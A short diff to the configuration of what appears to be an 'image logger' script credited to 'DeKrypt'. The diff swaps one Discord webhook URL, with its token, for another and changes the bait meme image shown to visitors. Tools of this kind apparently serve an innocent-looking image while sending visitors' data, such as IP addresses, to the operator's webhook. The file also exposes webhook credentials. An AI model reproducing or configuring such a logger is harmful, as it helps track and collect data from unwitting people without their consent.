@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://upload.wikimedia.org/wikipedia/en/thumb/9/96/Meme_Man_on_transparent_background.webp/250px-Meme_Man_on_transparent_background.webp.png", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1519454292757581904/b-iDu8MdIC1IPQBVeOSK9_xzuz1Hu_b6EhjcCl_jcF4euNjiOgiFHu2Ql_dgwfdihhor",
+    "image": "https://media.tenor.com/2IpkXtn0KAAAAAAe/tiktok-tiktok-memes.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
